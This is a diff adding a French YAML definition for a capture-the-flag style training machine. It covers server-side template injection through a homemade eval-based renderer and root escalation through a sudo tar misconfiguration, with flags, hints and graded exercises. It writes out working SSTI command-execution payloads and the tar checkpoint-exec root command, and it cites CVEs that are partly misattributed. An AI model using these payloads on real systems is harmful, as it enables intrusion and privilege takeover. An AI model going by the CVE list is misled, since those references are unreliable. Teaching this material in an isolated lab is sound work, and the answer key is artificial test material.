@@ -1,0 +1,104 @@
+title: Rouille
+track: offensif
+machine_os: linux
+level: intermediaire
+order: 3
+tags: [machine, web, ssti, injection de modèle, rce, élévation de privilèges, sudo, linux, cve]
+summary: Machine Moyenne Linux - un moteur de modèles maison évalue les expressions {{ ... }} (SSTI) et donne l'exécution de code, puis un sudo tar mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{r0u1ll3_sst1_3val_rce}"
+  root: "TDM{r0u1ll3_sud0_tar_r00t}"
+description: |
+  **Machine : Rouille · Moyenne · 🐧 Linux**
+
+  La cible héberge « Rouille Notes », un carnet d'équipe avec un **aperçu de modèles**. Comme tu ne peux
+  l'atteindre que par le réseau (hôte `cible`), explore l'application, trouve où tes entrées sont
+  **rendues**, et transforme ce rendu en exécution de code. Objectif HTB classique : drapeau
+  **utilisateur** (`user.txt`) puis élévation vers le drapeau **root** (`root.txt`).
+
+  Tout est isolé dans le réseau du lab (`internal`). **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - repère le champ « Modele » et l'endpoint `/apercu`.
+  2. Le moteur rend les expressions entre `{{ ... }}`. Teste une opération : `{{ 7*6 }}`. Si « 42 »
+     s'affiche, c'est une **injection de modèle (SSTI)**.
+  3. De l'arithmétique à la RCE : un `eval` te laisse appeler des fonctions Python. Lis un fichier, puis
+     exécute des commandes pour récupérer `user.txt` (service `web`).
+  4. `sudo -l` : le service peut lancer un binaire en root sans mot de passe. Sur *GTFOBins*, ce binaire
+     permet d'exécuter une commande en root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `nmap`, `python3`.
+cours: |
+  ## Injection de modèle côté serveur (SSTI) et élévation par sudo
+
+  ### SSTI
+
+  Un **moteur de modèles** mélange du texte et des expressions à évaluer (`{{ ... }}`, `${ ... }`...).
+  Quand l'application insère une **entrée utilisateur** dans le modèle avant de le rendre, l'attaquant
+  injecte ses propres expressions : c'est la *Server-Side Template Injection*. Selon le moteur, cela va
+  de la fuite de variables à la **RCE** complète. Des CVE marquantes de cette famille :
+
+  - **CVE-2016-10033 / Jinja2, Twig, Freemarker** : SSTI menant à l'exécution de code.
+  - **CVE-2019-8341** (Jinja2 dans Ansible-vault docs), **CVE-2020-9402**, **CVE-2022-29078** (ejs) :
+    des moteurs très répandus où une entrée rendue donne une RCE.
+
+  Ici, le moteur « maison » fait littéralement `eval(expression)`. On passe donc de `{{ 7*6 }}` à :
+
+  ```
+  curl -s -G http://cible/apercu --data-urlencode "modele={{ open('/home/web/user.txt').read() }}"
+  curl -s -G http://cible/apercu --data-urlencode "modele={{ __import__('subprocess').getoutput('id') }}"
+  ```
+
+  La deuxième te donne une **exécution de commandes** arbitraires en tant que `web`.
+
+  ### Élévation de privilèges par sudo (GTFOBins)
+
+  `sudo -l` révèle `(root) NOPASSWD: /usr/bin/tar`. `tar` peut exécuter une commande via son action de
+  point de contrôle (*GTFOBins*) :
+
+  ```
+  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/root.txt'
+  ```
+
+  Enchaîné dans le SSTI (donc en tant que `web`), cela lit `root.txt` **en root**.
+
+  ### Côté défense
+
+  Ne jamais rendre une entrée utilisateur comme modèle, ni l'évaluer (`eval`) : utiliser un moteur avec
+  bac à sable et échappement automatique, et ne jamais accorder de `sudo NOPASSWD` sur un binaire
+  capable d'exécuter des commandes (`tar`, `awk`, `find`, `vi`...).
+docs:
+  - title: OWASP - Server-Side Template Injection
+    url: https://owasp.org/www-community/attacks/Server_Side_Template_Injection
+  - title: GTFOBins - tar
+    url: https://gtfobins.github.io/gtfobins/tar/
+exercises:
+  - id: reconnaissance
+    title: Atteindre la cible
+    description: |
+      Depuis ce poste, confirme que « Rouille Notes » répond et repère l'aperçu de modèles.
+      Enregistre la page d'accueil dans `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      La cible n'est joignable que par son nom de service `cible` sur le réseau du lab. Identifier
+      l'endpoint `/apercu` et le champ `modele` est le point de départ de l'attaque.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Rouille' /root/reponses/accueil.html
+  - id: ssti
+    title: Prouver l'injection de modèle
+    description: |
+      Prouve que le moteur évalue tes expressions : fais afficher le résultat de `7*6` puis exécute `id`
+      **sur la cible** via le SSTI, et enregistre la sortie (`uid=...(web)`) dans `/root/reponses/ssti.txt`.
+    hint: "curl -s -G http://cible/apercu --data-urlencode \"modele={{ __import__('subprocess').getoutput('id') }}\" | tee /root/reponses/ssti.txt"
+    cours: |
+      Passer de `42` à la sortie de `id` prouve la bascule du simple rendu vers l'**exécution de code**.
+      Tu sais alors en tant que qui tu agis (`web`) et tu peux lire des fichiers puis chercher
+      l'élévation de privilèges.
+    checks:
+      - desc: Le SSTI exécute du code en tant que web
+        run: grep -q 'uid=' /root/reponses/ssti.txt && grep -q 'web' /root/reponses/ssti.txt
